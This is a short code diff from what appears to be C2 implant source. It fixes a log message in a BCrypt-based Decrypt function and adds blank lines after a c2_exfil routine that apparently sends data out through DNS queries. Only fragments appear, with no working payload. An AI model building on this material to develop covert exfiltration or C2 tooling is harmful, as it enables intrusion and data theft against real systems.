@@ -314,7 +314,7 @@ char* Decrypt(char* ciphertext, int len, int* pOutLen) {
     // Now perform actual encryption
     status = BCryptDecrypt(hKey, ciphertext, len, NULL, iv, sizeof(iv), message, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
     if (status != STATUS_SUCCESS) {
-        c2_log("[!] SetupComms:BCryptDecrypt failed with status 0x%x\n", status);
+        c2_log("[!] Decrypt:BCryptDecrypt failed with status 0x%x\n", status);
         Free(message);
         return NULL;
     }
@@ -540,5 +540,8 @@ int c2_exfil(char* msg, int len) {
     c2_log("[+] DNS query success");
     return num_sent;
 }
+
+
+
 
 #endif
